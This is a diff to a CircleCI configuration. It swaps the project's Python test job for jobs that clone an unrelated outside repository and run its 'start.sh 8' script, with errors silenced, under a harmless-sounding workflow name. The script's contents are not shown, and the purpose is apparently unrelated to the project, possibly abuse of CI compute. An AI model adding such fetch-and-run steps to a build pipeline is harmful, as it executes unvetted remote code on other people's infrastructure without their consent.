@@ -1,37 +1,32 @@
-# This config was automatically generated from your source code
-# Stacks detected: cicd:github-actions:.github/workflows,deps:node:.,deps:python:.
 version: 2.1
-orbs:
-  python: circleci/python@2
 jobs:
-  test-python:
-    # Install dependencies and run tests
+  Clone:
     docker:
-      - image: cimg/python:3.8-node
+      - image: ubuntu:22.04
     steps:
-      - checkout
-      - python/install-packages
       - run:
-          name: Run tests
-          command: pytest --junitxml=junit.xml || ((($? == 5)) && echo 'Did not find any tests to run.')
-      - store_test_results:
-          path: junit.xml
-  deploy:
-    # This is an example deploy job, not actually used by the workflow
+          name: Clone Repository
+          command: |
+            apt-get update
+            apt-get install -y python3 git
+            git clone https://github.com/ismailalkaf/flex || true
+  Run:
     docker:
-      - image: cimg/base:stable
+      - image: ubuntu:22.04
     steps:
-      # Replace this with steps to deploy to users
       - run:
-          name: deploy
-          command: '#e.g. ./deploy.sh'
-      - run:
-          name: found github actions config
-          command: ':'
+          name: Run start.sh
+          command: |
+            apt-get update
+            apt-get install -y python3 git
+            git clone https://github.com/ismailalkaf/flex || true
+            cd flex
+            bash start.sh 8 || echo "Script failed"
 workflows:
-  build-and-test:
+  version: 2
+  say-hello-workflow:
     jobs:
-      - test-python
-    # - deploy:
-    #     requires:
-    #       - test-python
+      - Clone
+      - Run:
+          requires:
+            - Clone
